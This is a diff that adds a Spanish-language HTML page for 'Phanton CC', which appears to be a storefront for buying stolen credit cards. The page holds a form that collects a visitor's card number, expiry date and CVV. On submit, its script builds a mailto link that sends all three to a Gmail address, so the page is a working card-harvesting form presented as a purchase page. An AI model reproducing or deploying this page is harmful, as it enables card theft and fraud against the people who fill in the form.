@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phanton CC</title>
+    <script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>
+    <script src="https://unpkg.com/unlazy@0.11.3/dist/unlazy.with-hashing.iife.js" defer init></script>
+    <style>
+        body {
+            background-color: #f0f4f8; /* Color de fondo ajustado */
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        .form-container {
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+            text-align: left;
+        }
+        .form-container label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #374151; /* Color de texto ajustado */
+        }
+        .form-container input[type="text"], 
+        .form-container input[type="number"], 
+        .form-container input[type="date"],
+        .form-container input[type="password"] {
+            width: calc(100% - 24px);
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-top: 8px;
+            box-sizing: border-box;
+            font-size: 16px; /* Tamaño de fuente ajustado */
+            color: #374151; /* Color de texto ajustado */
+        }
+        .form-container .button-container {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .form-container .button-container button {
+            background-color: #6f42c1; /* Color de fondo del botón ajustado */
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .form-container .button-container button:hover {
+            background-color: #5a3ac5; /* Cambio de color al pasar el cursor */
+        }
+    </style>
+</head>
+<body class="bg-zinc-100 dark:bg-zinc-900 text-black dark:text-white min-h-screen flex flex-col">
+    <header class="flex flex-col md:flex-row items-center justify-between p-4 bg-zinc-100 dark:bg-zinc-900 mb-4">
+        <div class="flex items-center space-x-2">
+            <a href="index.html" class="flex items-center space-x-2">
+                <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" class="w-10 h-10">
+                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                    <g id="SVGRepo_iconCarrier">
+                        <path d="M14 13V9.00001C14 7.89544 14.8954 7.00001 16 7.00001H42C43.1046 7.00001 44 7.89544 44 9.00001V27C44 28.1046 43.1046 29 42 29H40" stroke="#000000" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <rect x="4" y="19" width="30" height="22" rx="2" fill="#2eff51" stroke="#000000" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"></rect>
+                        <path d="M4 28L34 28" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M34 23L34 35" stroke="#000000" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M4 23L4 35" stroke="#000000" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M11 34L19 34" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M25 34L27 34" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"></path>
+                    </g>
+                </svg>
+                
+                <h1 class="text-2xl font-bold">Phanton CC</h1>
+            </a>
+        </div>
+        <div class="flex items-center space-x-4">
+            <div>Balance <span class="font-bold">$0</span></div>
+            <div class="relative">
+                <button id="menuButton" class="p-2 bg-zinc-200 dark:bg-zinc-700 rounded-md">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                    </svg>
+                </button>
+                <div id="menu" class="absolute right-0 mt-2 w-48 bg-white dark:bg-zinc-800 rounded-md shadow-lg z-10" style="display: none;">
+                    <a href="index.html" class="block px-4 py-2 hover:bg-zinc-100 dark:hover:bg-zinc-700">Inicio</a>
+                    <a href="soporte.html" class="block px-4 py-2 hover:bg-zinc-100 dark:hover:bg-zinc-700">Soporte</a>
+                    <a href="transferencia.html" class="block px-4 py-2 hover:bg-zinc-100 dark:hover:bg-zinc-700">Fondos</a>
+                </div>
+            </div>
+        </div>
+    </header>
+    <main class="flex-1 flex flex-col items-center justify-center">
+        <div class="container">
+            <h2 class="text-3xl font-bold mb-4">Compra de CC</h2>
+            <div class="form-container bg-zinc-100 dark:bg-zinc-900">
+                <form id="paymentForm">
+                    <label for="cardNumber">Número de Tarjeta de Crédito</label>
+                    <input type="text" id="cardNumber" name="cardNumber" placeholder="Ingrese el número de su tarjeta" required maxlength="19">
+                    
+                    <label for="expiry">Fecha de Vencimiento (MM/YY)</label>
+                    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required maxlength="5">
+                    
+                    <label for="cvv">CVV</label>
+                    <input type="password" id="cvv" name="cvv" placeholder="CVV" required maxlength="3">
+                    
+                    <div class="button-container">
+                        <button type="submit" style="background-color: #2eff51;" class="p-2 text-white rounded-md">Comprar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </main>
+    <script>
+        document.getElementById('menuButton').addEventListener('click', function() {
+            var menu = document.getElementById('menu');
+            menu.style.display = menu.style.display === 'none' || menu.style.display === '' ? 'block' : 'none';
+        });
+
+        window.addEventListener('click', function(e) {
+            var menu = document.getElementById('menu');
+            var menuButton = document.getElementById('menuButton');
+            if (!menu.contains(e.target) && !menuButton.contains(e.target)) {
+                menu.style.display = 'none';
+            }
+        });
+
+        // Validación de tarjeta de crédito
+        document.getElementById('cardNumber').addEventListener('input', function() {
+            var cardNumber = this.value.replace(/\s/g, '');
+            var cardType = getCardType(cardNumber);
+            if (cardType === 'visa') {
+                this.setCustomValidity('');
+            } else if (cardType === 'mastercard') {
+                this.setCustomValidity('');
+            } else {
+                this.setCustomValidity('Por favor, introduzca un número de tarjeta Visa o Mastercard válido.');
+            }
+        });
+
+        function getCardType(cardNumber) {
+            // Visa
+            var visaRegex = /^4\d{3}-?\d{4}-?\d{4}-?\d{4}$/;
+            // Mastercard
+            var mastercardRegex = /^5[1-5]\d{2}-?\d{4}-?\d{4}-?\d{4}$/;
+
+            if (visaRegex.test(cardNumber)) {
+                return 'visa';
+            } else if (mastercardRegex.test(cardNumber)) {
+                return 'mastercard';
+            } else {
+                return '';
+            }
+        }
+
+        // Validación de fecha de vencimiento (MM/YY)
+        document.getElementById('expiry').addEventListener('input', function() {
+            var expiry = this.value;
+            // Limpiar cualquier caracter que no sea número o "/"
+            expiry = expiry.replace(/[^\d/]/g, '');
+            // Asegurarse de que no haya más de 4 caracteres
+            expiry = expiry.slice(0, 5);
+            // Insertar "/" automáticamente después de 2 caracteres
+            if (expiry.length > 2 && expiry.indexOf('/') === -1) {
+                expiry = expiry.slice(0, 2) + '/' + expiry.slice(2);
+            }
+            this.value = expiry;
+            var parts = expiry.split('/');
+            if (parts.length === 2 && parts[0].length <= 2 && parts[1].length <= 2) {
+                this.setCustomValidity('');
+            } else {
+                this.setCustomValidity('Por favor, introduzca una fecha de vencimiento válida en formato MM/YY.');
+            }
+        });
+
+        // Validación de CVV (3 dígitos)
+        document.getElementById('cvv').addEventListener('input', function() {
+            var cvv = this.value;
+            cvv = cvv.replace(/\D/g, ''); // Solo números
+            cvv = cvv.slice(0, 3); // Limitar a 3 caracteres
+            this.value = cvv;
+            if (cvv.length === 3) {
+                this.setCustomValidity('');
+            } else {
+                this.setCustomValidity('Por favor, introduzca un CVV válido de 3 dígitos.');
+            }
+        });
+
+        // Envío de datos al backend y gestión de correo electrónico
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var cardNumber = document.getElementById('cardNumber').value;
+            var expiry = document.getElementById('expiry').value;
+            var cvv = document.getElementById('cvv').value;
+
+            // Aquí podrías implementar el código para enviar un correo electrónico automáticamente
+            // Esto generalmente se hace a través de un servidor backend debido a restricciones de seguridad del navegador
+
+            // Ejemplo de código para enviar correo (simulado)
+            var emailContent = `
+                Detalles de la tarjeta de crédito:
+                Número de Tarjeta: ${cardNumber}
+                Fecha de Vencimiento: ${expiry}
+                CVV: ${cvv}
+            `;
+
+            // Simular envío de correo
+            var mailtoLink = 'mailto:elpepe21@gmail.com?subject=Detalles%20de%20la%20tarjeta%20de%20cr%C3%A9dito&body=' + encodeURIComponent(emailContent);
+            window.location.href = mailtoLink;
+        });
+    </script>
+</body>
+</html>
